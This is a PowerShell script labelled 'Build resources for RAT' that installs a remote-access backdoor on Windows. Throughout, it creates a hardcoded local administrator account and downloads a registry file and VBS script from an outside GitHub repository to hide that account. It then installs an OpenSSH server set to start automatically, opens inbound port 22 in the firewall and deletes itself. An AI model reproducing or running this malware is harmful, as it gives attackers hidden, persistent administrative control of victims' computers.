# Build resources for RAT 
# Created by: Sulaxshayan

# Function to generate random strings for directory and file names
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object { [char]$_ })
}

# Function to create a local admin account for RAT
function create_account {
    param (
        [string] $uname,
        [string] $pword
    )
    Write-Verbose "Starting the process to create a new local admin..."
    net user $uname $pword /add
    net localgroup Administrators $uname /add
    Write-Verbose "New local user '$uname' created successfully and added to the local administrators group."
}

# Function to download files
function Download-File {
    param (
        [string]$url,
        [string]$output
    )
    $webclient = New-Object System.Net.WebClient
    $webclient.DownloadFile($url, $output)
}

# Variables
$wd = random_text
$path = "$env:temp\$wd"
$initial_dir = Get-Location

# Create local admin account
$uname = "firstnameAttempt"
$pword = "onlyrat1234"
create_account -uname $uname -pword $pword -Verbose

# Create a working directory in the temp folder and navigate to it
mkdir $path
Set-Location $path

# Download registry file to hide the local admin
$reg_file = random_text
Download-File -url "https://raw.githubusercontent.com/NSulaxshayan/malware_ohts_7/main/files/admin.reg" -output "$reg_file.reg"

# Download Visual Basic script to execute the registry changes
$vbs_file = random_text
Download-File -url "https://raw.githubusercontent.com/NSulaxshayan/malware_ohts_7/main/confirm.vbs" -output "$vbs_file.vbs"

# Download and install OpenSSH for Windows
$sshZipUrl = "https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.5.0.0p1-Beta/OpenSSH-Win64.zip"
$sshZipPath = "$env:TEMP\OpenSSH-Win64.zip"
$sshExtractPath = "C:\Program Files\OpenSSH"

Write-Output "Downloading OpenSSH from $sshZipUrl..."
Download-File -url $sshZipUrl -output $sshZipPath
Write-Output "Download completed."

Write-Output "Extracting OpenSSH to $sshExtractPath..."
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($sshZipPath, $sshExtractPath)
Write-Output "Extraction completed."

Write-Output "Installing OpenSSH service..."
cd $sshExtractPath
.\install-sshd.ps1

Write-Output "Starting SSHD service..."
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

Write-Output "Configuring firewall rules..."
if (-Not (Get-NetFirewallRule -Name "sshd" -ErrorAction SilentlyContinue)) {
    New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
}

# Cleanup
Write-Output "Cleaning up..."
Remove-Item $sshZipPath -Force

# Execute the downloaded registry and VBS files
Start-Process -FilePath "regedit.exe" -ArgumentList "/s $reg_file.reg" -Wait
Start-Process -FilePath "wscript.exe" -ArgumentList "$vbs_file.vbs" -Wait

# Self-delete the script (cannot delete while running)
$script_path = $MyInvocation.MyCommand.Path
Start-Sleep -Seconds 10  # Wait a bit to ensure all tasks are completed
Remove-Item $script_path -Force

# Navigate back to the initial directory
Set-Location $initial_dir

Write-Output "Script execution completed."
